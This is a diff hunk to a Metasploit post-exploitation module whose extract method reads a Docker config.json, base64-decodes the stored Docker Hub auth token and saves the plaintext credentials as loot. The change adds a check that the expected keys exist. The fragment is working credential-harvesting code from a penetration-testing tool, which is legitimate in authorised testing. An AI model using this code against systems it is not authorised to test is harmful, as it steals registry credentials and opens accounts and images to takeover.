@@ -57,13 +57,16 @@ class MetasploitModule < Msf::Post
   def extract(target)
     file = read_file(target)
     parsed = JSON.parse(file)
-    creds = parsed["auths"]["https://index.docker.io/v1/"]["auth"]
-    if creds.length > 0
-      plain = Rex::Text.decode_base64(creds)
-      print_good("Found #{plain}")
-      loot_path = store_loot("docker.credentials", "text/plain", session, plain,
-        "config.json", "Docker credentials from #{target}")
-      print_good("Saved credentials to #{loot_path}")
+    if parsed["auths"] && parsed["auths"]["https://index.docker.io/v1/"]
+      creds = parsed["auths"]["https://index.docker.io/v1/"]["auth"]
+
+      if creds.length > 0
+        plain = Rex::Text.decode_base64(creds)
+        print_good("Found #{plain}")
+        loot_path = store_loot("docker.credentials", "text/plain", session, plain,
+          "config.json", "Docker credentials from #{target}")
+        print_good("Saved credentials to #{loot_path}")
+      end
     else
       print_status("No credentials found in config file")
     end
